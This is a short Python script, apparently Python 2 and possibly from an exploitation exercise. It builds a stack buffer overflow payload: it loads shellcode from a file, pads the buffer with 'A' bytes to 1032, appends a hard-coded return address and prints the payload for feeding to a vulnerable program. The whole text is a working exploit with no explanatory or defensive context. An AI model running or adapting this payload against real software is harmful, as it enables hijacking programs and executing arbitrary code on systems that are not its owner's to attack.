buf = open("code", "rb").read()
buf += "A" * (1024 + 8 - len(buf))
buf += "\x1C\xFB\x19\x00"
print(buf)

